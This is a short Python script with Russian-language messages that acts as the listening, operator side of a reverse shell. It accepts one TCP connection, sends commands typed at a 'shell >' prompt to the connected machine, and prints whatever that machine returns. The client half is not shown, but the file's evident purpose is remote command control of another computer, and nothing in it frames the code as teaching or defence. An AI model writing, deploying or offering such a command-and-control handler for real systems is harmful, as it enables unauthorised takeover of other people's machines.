import socket
import threading
import sys

def handle_client(client_socket):
    try:
        while True:
            command = input("shell > ")
            if not command:
                continue
            if command.lower() == 'exit':
                client_socket.send(command.encode())
                break
            client_socket.send(command.encode())
            
            output = client_socket.recv(4096).decode()
            print(output)
    except Exception as e:
        print(f"Ошибка: {e}")
    finally:
        client_socket.close()

def start_server(host, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"[*] Сервер слушает на {host}:{port}")

    try:
        client_socket, addr = server.accept()
        print(f"[*] Принято соединение от {addr[0]}:{addr[1]}")
        handle_client(client_socket)
    except KeyboardInterrupt:
        print("\n[*] Сервер остановлен")
    finally:
        server.close()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Использование: python server.py <HOST> <PORT>")
        sys.exit(1)
    
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])
    
    start_server(HOST, PORT)
